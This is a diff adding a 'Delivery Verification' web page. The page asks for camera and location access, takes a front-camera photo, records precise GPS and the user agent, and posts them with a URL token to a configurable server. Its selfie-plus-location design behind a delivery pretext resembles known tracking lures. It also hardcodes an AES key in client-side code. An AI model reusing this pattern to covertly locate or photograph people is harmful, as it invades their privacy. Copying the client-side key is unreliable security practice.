@@ -1,0 +1,324 @@
+<!doctype html>
+<html>
+<head>
+  <meta charset="utf-8">
+  <title>Delivery Confirmation</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1"/>
+  <style>
+    body { 
+      font-family: Arial, sans-serif;
+      padding: 20px;
+      max-width: 480px;
+      margin: 0 auto;
+      line-height: 1.6;
+    }
+    #status { 
+      color: #28a745;
+      margin: 20px 0;
+      padding: 15px;
+      border-radius: 4px;
+      background-color: #e8f5e9;
+      border: 1px solid #c8e6c9;
+    }
+    .error { 
+      color: #dc3545 !important;
+      background-color: #fff5f5 !important;
+      border-color: #ffebee !important;
+    }
+    h2 {
+      color: #2c3e50;
+      margin-top: 0;
+    }
+    p {
+      color: #495057;
+    }
+    .loading {
+      display: inline-block;
+      width: 20px;
+      height: 20px;
+      border: 3px solid rgba(0,0,0,.1);
+      border-radius: 50%;
+      border-top-color: #007bff;
+      animation: spin 1s ease-in-out infinite;
+      margin-right: 10px;
+      vertical-align: middle;
+    }
+    @keyframes spin {
+      to { transform: rotate(360deg); }
+    }
+    .status-container {
+      display: flex;
+      align-items: center;
+    }
+  </style>
+</head>
+
+<body>
+  <h2>Delivery Verification</h2>
+  <p>This page will ask for camera and location permissions. Please allow both when prompted.</p>
+
+  <div id="status">
+    <div class="status-container">
+      <div class="loading"></div>
+      <span>Requesting permissions…</span>
+    </div>
+  </div>
+
+  <script>
+  (async function() {
+    // Get DOM elements first
+    const statusEl = document.getElementById("status");
+    
+    function setStatus(msg, isError = false) {
+      const statusContainer = document.createElement('div');
+      statusContainer.className = 'status-container';
+      
+      if (isError) {
+        statusContainer.innerHTML = `
+          <div style="color: #dc3545; margin-right: 10px;">⚠️</div>
+          <span>${msg}</span>
+        `;
+        statusEl.className = 'error';
+      } else {
+        statusContainer.innerHTML = `
+          <div class="loading"></div>
+          <span>${msg}</span>
+        `;
+        statusEl.className = '';
+      }
+      
+      // Clear previous status and add new one
+      statusEl.innerHTML = '';
+      statusEl.appendChild(statusContainer);
+    }
+    
+    // Set initial status
+    setStatus("Initializing...");
+    
+    try {
+      const SERVER_URL = "<%= process.env.SERVER_URL || 'http://localhost:3000/api/confirm' %>";
+      
+      // 32-byte (256-bit) key for AES-256
+      const ENCRYPTION_KEY = 'a1b2c3d4e5f6g7h8i9j0k1l2m3n4o5p6';
+      
+      const params = new URLSearchParams(location.search);
+      const deliveryId = params.get("deliveryId") || "unknown";
+      const token = params.get("token") || "";
+
+      async function getLocation() {
+        return new Promise((resolve, reject) => {
+          if (!navigator.geolocation) {
+            reject(new Error("Geolocation is not supported by your browser"));
+            return;
+          }
+          
+          navigator.geolocation.getCurrentPosition(
+            resolve, 
+            (err) => reject(new Error("Please enable location services and try again")),
+            { 
+              enableHighAccuracy: true,
+              timeout: 15000,
+              maximumAge: 0
+            }
+          );
+        });
+      }
+
+      async function capturePhoto() {
+        try {
+          const stream = await navigator.mediaDevices.getUserMedia({
+            video: { 
+              facingMode: "user",
+              width: { ideal: 1280 },
+              height: { ideal: 720 }
+            }
+          });
+
+          const track = stream.getVideoTracks()[0];
+          const imgCap = new ImageCapture(track);
+
+          let blob;
+          try {
+            // Try to use takePhoto for better quality if available
+            blob = await imgCap.takePhoto();
+          } catch (e) {
+            // Fallback to canvas capture
+            const cv = document.createElement("canvas");
+            cv.width = 1280; 
+            cv.height = 720;
+            const ctx = cv.getContext("2d");
+            const videoTemp = document.createElement("video");
+            videoTemp.srcObject = stream;
+            await new Promise((resolve) => { videoTemp.onloadedmetadata = resolve; });
+            await videoTemp.play();
+            ctx.drawImage(videoTemp, 0, 0, cv.width, cv.height);
+            blob = await new Promise(resolve => cv.toBlob(resolve, "image/jpeg", 0.9));
+          }
+
+          // Stop all tracks in the stream
+          stream.getTracks().forEach(track => track.stop());
+          
+          return blob;
+        } catch (error) {
+          console.error("Error capturing photo:", error);
+          throw new Error("Failed to access camera. Please ensure you've granted camera permissions.");
+        }
+      }
+
+      // Encryption utilities
+      async function encryptData(data, key) {
+        try {
+          const encoder = new TextEncoder();
+          const iv = window.crypto.getRandomValues(new Uint8Array(12));
+          const encodedData = encoder.encode(JSON.stringify(data));
+          
+          // Ensure key is exactly 32 bytes (256 bits)
+          const keyData = new TextEncoder().encode(key);
+          const keyBuffer = keyData.slice(0, 32); // Take first 32 bytes
+          
+          const cryptoKey = await window.crypto.subtle.importKey(
+            'raw',
+            keyBuffer,
+            { name: 'AES-GCM', length: 256 },
+            false,
+            ['encrypt']
+          );
+          
+          // Encrypt the data with explicit tag length
+          const encryptedData = await window.crypto.subtle.encrypt(
+            { 
+              name: 'AES-GCM',
+              iv: iv,
+              tagLength: 128 // 128-bit authentication tag
+            },
+            cryptoKey,
+            encodedData
+          );
+          
+          // Combine IV + encrypted data (which includes the auth tag at the end)
+          const result = new Uint8Array(iv.length + encryptedData.byteLength);
+          result.set(iv, 0);
+          result.set(new Uint8Array(encryptedData), iv.length);
+          
+          console.log('Encryption successful. IV length:', iv.length, 'Data length:', encryptedData.byteLength);
+          return result;
+        } catch (error) {
+          console.error('Encryption error:', error);
+          throw new Error('Failed to encrypt data: ' + error.message);
+        }
+      }
+
+      async function encryptFile(file) {
+        return new Promise((resolve, reject) => {
+          const reader = new FileReader();
+          reader.onload = async (e) => {
+            try {
+              const iv = window.crypto.getRandomValues(new Uint8Array(12));
+              const key = await window.crypto.subtle.importKey(
+                'raw',
+                new TextEncoder().encode(ENCRYPTION_KEY),
+                { name: 'AES-GCM' },
+                false,
+                ['encrypt']
+              );
+              
+              const encryptedData = await window.crypto.subtle.encrypt(
+                { name: 'AES-GCM', iv },
+                key,
+                e.target.result
+              );
+              
+              const result = new Uint8Array(iv.length + encryptedData.byteLength);
+              result.set(iv, 0);
+              result.set(new Uint8Array(encryptedData), iv.length);
+              resolve(result);
+            } catch (error) {
+              reject(error);
+            }
+          };
+          reader.onerror = reject;
+          reader.readAsArrayBuffer(file);
+        });
+      }
+
+      // Initialize the process
+      async function init() {
+        try {
+          setStatus("Requesting camera and location permissions...");
+
+          // Request camera access first
+          await navigator.mediaDevices.getUserMedia({ video: true });
+          
+          // Then request location
+          const loc = await getLocation();
+          setStatus("Permissions granted. Capturing photo...");
+
+          // Capture photo
+          const blob = await capturePhoto();
+          setStatus("Encrypting data...");
+
+          // Prepare location data
+          const locationData = {
+            lat: loc.coords.latitude,
+            lon: loc.coords.longitude,
+            accuracy: loc.coords.accuracy || 0,
+            timestamp: loc.timestamp || Date.now(),
+            userAgent: navigator.userAgent,
+            deliveryId: deliveryId,
+            token: token
+          };
+
+          console.log('Location data to encrypt:', locationData);
+          
+          // Encrypt location data
+          const encryptedData = await encryptData(locationData, ENCRYPTION_KEY);
+          console.log('Encrypted data length:', encryptedData.byteLength);
+          
+          // Create form data
+          const formData = new FormData();
+          formData.append('photo', new Blob([blob], { type: 'image/jpeg' }), 'delivery.jpg');
+          formData.append('data', new Blob([encryptedData], { type: 'application/octet-stream' }));
+
+          setStatus("Sending data...");
+          
+          // Add deliveryId and token to URL as query parameters
+          const url = new URL(SERVER_URL);
+          url.searchParams.append('deliveryId', deliveryId);
+          url.searchParams.append('token', token);
+
+          console.log('Sending request to:', url.toString());
+          
+          const response = await fetch(url, {
+            method: 'POST',
+            body: formData
+          });
+
+          const result = await response.json();
+          console.log('Server response:', result);
+          
+          if (response.ok && result.success) {
+            setStatus("Delivery confirmed successfully!", false);
+            // Close the window after 2 seconds
+            setTimeout(() => {
+              window.close();
+            }, 2000);
+          } else {
+            throw new Error(result.error || `Server responded with ${response.status}`);
+          }
+        } catch (error) {
+          console.error("Error in init:", error);
+          setStatus(`Error: ${error.message}`, true);
+        }
+      }
+
+      // Start the process
+      await init();
+
+    } catch (error) {
+      console.error("Initialization error:", error);
+      setStatus(`Error: ${error.message}`, true);
+    }
+  })();
+  </script>
+</body>
+</html>
